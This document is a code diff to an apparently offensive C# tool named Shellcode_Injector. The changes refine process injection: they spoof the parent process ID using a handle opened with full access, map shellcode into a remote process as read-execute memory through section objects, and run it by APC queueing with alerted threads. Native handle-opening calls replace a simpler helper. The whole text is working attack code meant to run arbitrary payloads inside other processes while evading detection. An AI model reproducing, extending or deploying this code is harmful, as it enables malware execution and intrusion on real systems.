@@ -3,6 +3,7 @@ using System.ComponentModel;
 using System.Diagnostics;
 using System.Net;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 using static Shellcode_Injector.WinApi;
 
 
@@ -55,7 +56,7 @@ namespace Shellcode_Injector
             if (spoof_ppid) 
             {
                 //Set the parent process attribute
-                IntPtr ppcs = WinApi.OpenP(0x001F0FFF, false, ppid); //ALL ACCESS
+                (IntPtr ppcs, IntPtr pthr) = GetHand(ppid);
                 IntPtr pValue = Marshal.AllocHGlobal(sizeof(long));
                 Marshal.WriteInt64(pValue, (long)ppcs);
 
@@ -168,7 +169,7 @@ namespace Shellcode_Injector
             var hsec = IntPtr.Zero;
             var sc_size = (ulong)sc.Length;
             //Create new memory block section in the current process
-            WinApi.cSection(
+            int status = WinApi.cSection(
                 ref hsec,
                 (ulong)WinApi.gen.sec_accs,
                 IntPtr.Zero,
@@ -179,7 +180,7 @@ namespace Shellcode_Injector
                 );
 
             //Map the view of the created section into the memory of the current process
-            WinApi.mvSection(
+            status = WinApi.mvSection(
                 hsec,
                 (IntPtr)(-1),   // Will target current Process
                 out var laddr,
@@ -196,7 +197,7 @@ namespace Shellcode_Injector
             Marshal.Copy(sc, 0, laddr, sc.Length);
 
             //Map the created region as RX into the remote process
-            WinApi.mvSection(
+            status = WinApi.mvSection(
                 hsec,
                 phand,
                 out var raddr,
@@ -208,6 +209,7 @@ namespace Shellcode_Injector
                 0,
                 (uint)WinApi.mem.rx
                 );
+
             return raddr;
         }
 
@@ -223,6 +225,7 @@ namespace Shellcode_Injector
             {
                 Console.WriteLine("Executing the code trough queue user apc");
                 WinApi.APC(mem, proc.hThread, 0);
+                WinApi.Alert(proc.hThread);
                 WinApi.Resume(proc.hThread);
             }
         }
@@ -249,16 +252,33 @@ namespace Shellcode_Injector
             } else if (tchq == "nqat") 
             {
                 Console.WriteLine("Executing the code trough nt queue APC thread");
-                WinApi.NAPC(proc.hThread, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                ntstat status = WinApi.NAPC(proc.hThread, mem, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                status = WinApi.Alert(proc.hThread);
                 WinApi.Resume(proc.hThread);
             }
         }
 
-        //Get a remote handle
-        public static IntPtr GetHand(int id) 
+        //Get handle for the remote process
+        public static (IntPtr, IntPtr) GetHand(uint id) 
         {
-            var proc = Process.GetProcessById(id);
-            return proc.Handle;
+            Console.WriteLine($"Opening handle for process: {id}");
+            WinApi.ClntId cid = new WinApi.ClntId();
+            cid.UnqProc = (IntPtr)id;
+            cid.UnqThr = (IntPtr)0;
+
+            WinApi.ObjAttr oa = new WinApi.ObjAttr(0, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
+            oa.Length = Marshal.SizeOf(oa);
+            IntPtr phand = IntPtr.Zero;
+            IntPtr thand = IntPtr.Zero;
+
+            //Open a handle to the target process
+            WinApi.OpenP(ref phand, WinApi.all_accs, ref oa, ref cid);
+
+            //Open a handle to a thread
+            //int status = WinApi.OpenT(ref thand, 0x1FFFFF, ref oa, ref cid);
+            //Console.WriteLine($"Open thread status: {status.ToString("X")}");
+
+            return (phand, thand);
         }
     }
 }
